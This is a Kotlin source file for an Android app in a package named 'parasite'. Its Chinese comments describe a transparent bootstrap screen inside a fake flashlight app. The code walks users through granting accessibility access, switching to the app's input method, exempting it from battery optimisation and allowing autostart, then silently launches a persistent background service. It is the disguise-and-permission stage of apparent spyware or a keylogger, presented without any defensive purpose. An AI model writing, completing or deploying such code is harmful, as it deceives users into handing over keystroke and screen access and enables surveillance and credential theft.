package com.mqf.parasite

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.util.Log

/**
 * 透明引导 Activity — 蚕蛹第一阶段 "脱壳"
 * =========================================
 *
 * 一次性引导:用户打开"手电筒 App" 后弹出透明 UI,
 * 引导用户完成:
 *   1. 无障碍授权 (AccessibilityService)
 *   2. 输入法切换 (InputMethodService)
 *   3. 电池优化豁免
 *   4. 自启动权限
 * 完成后自动消失,启动常驻 Service。
 */
class MqfBootstrapActivity : Activity() {

    companion object {
        const val TAG = "mqf_bootstrap"
        const val STEP_REQUEST_ACCESSIBILITY = 1001
        const val STEP_REQUEST_IME = 1002
        const val STEP_REQUEST_BATTERY = 1003
    }

    private var step = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.i(TAG, "[chrysalis molt] bootstrap start, step=0")
        nextStep()
    }

    private fun nextStep() {
        when (step) {
            0 -> {
                // Step 1: Guide Accessibility
                step = 1
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivityForResult(intent, STEP_REQUEST_ACCESSIBILITY)
            }
            1 -> {
                // Step 2: Guide IME switch
                step = 2
                val intent = Intent(Settings.ACTION_INPUT_METHOD_SETTINGS)
                startActivityForResult(intent, STEP_REQUEST_IME)
            }
            2 -> {
                // Step 3: Battery exemption
                step = 3
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName"))
                startActivityForResult(intent, STEP_REQUEST_BATTERY)
            }
            3 -> {
                // Step 4: Launch foreground Service, finish
                step = 4
                startForegroundService(Intent(this, MqfCoreService::class.java))
                Log.i(TAG, "[chrysalis] bootstrap done, service launched")
                finish()
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        nextStep()
    }
}
